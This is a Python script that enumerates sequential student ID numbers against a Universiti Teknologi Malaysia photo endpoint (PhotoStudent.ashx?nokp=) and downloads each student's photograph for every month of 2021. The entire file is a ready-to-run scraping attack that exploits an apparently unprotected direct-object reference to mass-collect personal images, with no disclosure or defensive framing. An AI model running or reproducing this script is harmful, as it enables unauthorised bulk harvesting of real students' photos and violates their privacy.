import requests
import os

def download_images(year, month, start=10000, end=11000):
    base_url = "https://academic.utm.my/UGStudent/PhotoStudent.ashx?nokp="
    error_count = 0
    max_errors = 15

    directory = f"{year}/{month}"
    if not os.path.exists(directory):
        os.makedirs(directory)

    for i in range(start, end + 1):  # Set range from start to end
        nokp = f"{year}{month}M{i:05d}"  # I wonder what M stands for?
        url = base_url + nokp
        response = requests.get(url)
        if response.status_code == 200 and response.content:
            if len(response.content) > 100:  # Check if the content is likely to be a valid image
                # Save the image
                with open(os.path.join(directory, f"{nokp}.jpg"), "wb") as f:
                    f.write(response.content)
                print(f"Downloaded {nokp}.jpg")
                error_count = 0  # Reset error count after a successful download
            else:
                print(f"Skipping {nokp}.jpg, file appears to be empty or invalid.")
        else:
            error_count += 1
            print(f"Failed to download {nokp}.jpg, error count: {error_count}")
            if error_count >= max_errors:
                print("Maximum error count reached, stopping...")
                break
# Example usage: download images for November 2021, from 10000 to 11000
download_images("2021", "01", 10000, 11000)
download_images("2021", "02", 10000, 11000)
download_images("2021", "03", 10000, 11000)
download_images("2021", "04", 10000, 11000)
download_images("2021", "05", 10000, 11000)
download_images("2021", "06", 10000, 11000)
download_images("2021", "07", 10000, 11000)
download_images("2021", "08", 10000, 11000)
download_images("2021", "09", 10000, 11000)
download_images("2021", "10", 10000, 11000)
download_images("2021", "11", 10000, 11000)
download_images("2021", "12", 10000, 11000)
